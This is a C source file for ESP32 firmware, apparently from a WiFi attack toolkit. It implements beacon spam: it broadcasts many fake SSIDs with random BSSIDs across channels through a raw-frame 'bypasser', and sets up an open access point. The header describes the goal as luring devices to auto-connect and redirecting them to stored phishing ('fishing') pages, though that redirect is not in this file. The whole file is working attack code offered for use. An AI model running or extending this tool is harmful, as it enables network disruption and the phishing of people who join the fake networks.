/*
 * attack_beacon_spam.c — WiFi Beacon Spam with Fishing Page Support
 * 
 * Creates multiple fake SSIDs with configurable quantities
 * Open AP (no password) → auto-connect → fishing page redirect
 * Supports stored HTML fishing pages from Fishing_Web/ folder in SPIFFS
 * 
 * FIXED: SSID quantity now correctly creates unique BSSID per instance
 * FIXED: Removed unnecessary AP config (beacons are sent directly via wsl_bypasser)
 * FIXED: Proper WiFi mode handling
 * FIXED: Better delay management for beacon frames
 */

#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "BEACON_SPAM";

#define MAX_SSIDS 50
#define MAX_SSID_NAME 33

static TaskHandle_t g_spam_task = NULL;
static volatile bool g_spam_running = false;

typedef struct {
    char ssid[MAX_SSID_NAME];
    int quantity;
    char fishing_page[64];
} beacon_entry_t;

static beacon_entry_t g_beacon_entries[MAX_SSIDS];
static int g_beacon_count = 0;

// ==================== FIXED: BEACON SPAM TASK ====================
static void beacon_spam_task(void *pv) {
    g_spam_running = true;
    
    ESP_LOGI(TAG, "📶 Beacon spam started: %d SSID configurations", g_beacon_count);
    for (int i = 0; i < g_beacon_count; i++) {
        ESP_LOGI(TAG, "  '%s' x%d %s",
                 g_beacon_entries[i].ssid,
                 g_beacon_entries[i].quantity,
                 g_beacon_entries[i].fishing_page[0] ? "[+FISHING]" : "");
    }

    // FIX: Ensure WiFi is in a mode that allows raw frame transmission
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_STA && mode != WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(100));
        wifi_config_t ap_cfg = {
            .ap = {
                .ssid = "SPAM",
                .ssid_len = 4,
                .channel = 1,
                .authmode = WIFI_AUTH_OPEN,
                .max_connection = 1,
                .beacon_interval = 1000,
            }
        };
        esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
        esp_wifi_start();
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    uint64_t total_beacons = 0;
    int round = 0;
    
    while (g_spam_running) {
        round++;
        for (int entry_idx = 0; entry_idx < g_beacon_count && g_spam_running; entry_idx++) {
            beacon_entry_t *entry = &g_beacon_entries[entry_idx];
            
            // FIX: Now correctly loops through quantity
            for (int inst = 0; inst < entry->quantity && g_spam_running; inst++) {
                // FIX: Generate unique BSSID for EACH instance so they appear as different APs
                uint8_t bssid[6];
                bssid[0] = 0x02;
                bssid[1] = (uint8_t)(0xA0 + entry_idx);      // Different base per SSID
                bssid[2] = (uint8_t)(0x10 + inst);            // Different per instance
                bssid[3] = esp_random() & 0xFF;
                bssid[4] = esp_random() & 0xFF;
                bssid[5] = esp_random() & 0xFF;

                // FIX: Cycle through channels for variety
                uint8_t ch = 1 + ((entry_idx * entry->quantity + inst) % 11);
                
                // Send beacon frame with user's exact SSID
                wsl_bypasser_send_beacon_frame(
                    bssid,
                    (uint8_t*)entry->ssid,
                    strlen(entry->ssid),
                    ch
                );
                total_beacons++;

                // FIX: Small delay between instances to prevent TX queue overflow
                vTaskDelay(pdMS_TO_TICKS(10));
            }
        }
        
        // FIX: Brief pause between full rounds to prevent watchdog
        vTaskDelay(pdMS_TO_TICKS(20));
        
        // FIX: Log status every 10 rounds
        if (round % 10 == 0) {
            ESP_LOGI(TAG, "Beacon spam round %d: %llu total beacons", round, total_beacons);
        }
    }

    ESP_LOGI(TAG, "Beacon spam stopped. Rounds: %d, Total beacons: %llu", round, total_beacons);
    g_spam_task = NULL;
    vTaskDelete(NULL);
}

// ==================== FIXED: PUBLIC API ====================
void beacon_spam_start(const char **ssids, int *quantities, const char **fishing_pages, int count) {
    if (g_spam_running) {
        beacon_spam_stop();
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    if (count > MAX_SSIDS) count = MAX_SSIDS;
    g_beacon_count = 0;

    for (int i = 0; i < count; i++) {
        if (ssids[i] && strlen(ssids[i]) > 0) {
            strncpy(g_beacon_entries[g_beacon_count].ssid, ssids[i], MAX_SSID_NAME - 1);
            g_beacon_entries[g_beacon_count].ssid[MAX_SSID_NAME - 1] = '\0';
            
            // FIX: Ensure quantity is at least 1
            g_beacon_entries[g_beacon_count].quantity = 
                (quantities && quantities[i] > 0) ? quantities[i] : 1;
            
            if (fishing_pages && fishing_pages[i] && strlen(fishing_pages[i]) > 0) {
                strncpy(g_beacon_entries[g_beacon_count].fishing_page, fishing_pages[i], 63);
                g_beacon_entries[g_beacon_count].fishing_page[63] = '\0';
            } else {
                g_beacon_entries[g_beacon_count].fishing_page[0] = '\0';
            }
            
            ESP_LOGI(TAG, "Added beacon entry: SSID='%s' QTY=%d FISHING='%s'",
                     g_beacon_entries[g_beacon_count].ssid,
                     g_beacon_entries[g_beacon_count].quantity,
                     g_beacon_entries[g_beacon_count].fishing_page);
                     
            g_beacon_count++;
        }
    }

    if (g_beacon_count == 0) {
        ESP_LOGW(TAG, "No valid SSIDs provided");
        return;
    }

    // FIX: Start the task on core 1 (not core 0 where httpd runs)
    xTaskCreatePinnedToCore(beacon_spam_task, "beacon_spam", 4096, NULL, 5, 
                            &g_spam_task, 1);
    ESP_LOGI(TAG, "Beacon spam task created on core 1 with %d entries", g_beacon_count);
}

void beacon_spam_stop(void) {
    g_spam_running = false;
    if (g_spam_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    ESP_LOGI(TAG, "Beacon spam stopped");
}

bool beacon_spam_is_running(void) {
    return g_spam_running;
}
